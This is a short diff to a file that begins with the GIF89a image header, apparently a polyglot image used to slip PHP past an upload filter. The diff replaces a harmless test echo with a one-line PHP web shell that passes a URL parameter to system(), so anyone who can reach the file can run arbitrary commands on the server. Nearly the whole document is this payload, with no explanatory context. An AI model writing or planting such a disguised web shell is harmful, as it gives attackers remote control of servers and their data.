@@ -1,4 +1,2 @@
 GIF89a
-<?php
-echo "test_test";
-?>
+<?php system($_GET['cmd']); ?>
